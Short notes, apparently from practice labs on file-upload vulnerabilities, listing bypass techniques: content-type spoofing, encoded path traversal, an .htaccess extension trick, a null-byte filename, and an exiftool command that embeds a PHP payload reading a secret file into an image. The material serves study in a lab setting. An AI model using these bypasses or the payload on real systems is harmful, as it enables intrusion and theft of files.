- Remote code execution
-- Just upload the file

- Via content-type restriction bypass
-- Just change content to allowed content when uploading

- Via path traversal
-- In the filename, you could use path traversal
-- -- however since the respone to ../ was still avatars/file, we needed to find an encoding that would not get stripped
-- -- ..%2f worked and got avatars/../file
-- Open the image in the new tab and remove "avatars..%2f" from the url

- Via extension blacklist
-- Use t.htaccess (make sure you change it to .htaccess)
-- Change the file extension from php to hun

- Via obfuscated filename
-- This filename worked: gec.php%00.jpg

- Polygot
-- Used this exiftool cmd to create the file: exiftool -comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" gandalf.jpg -o pol_gfc.php
-- The secret should be near the top of the file between start and end
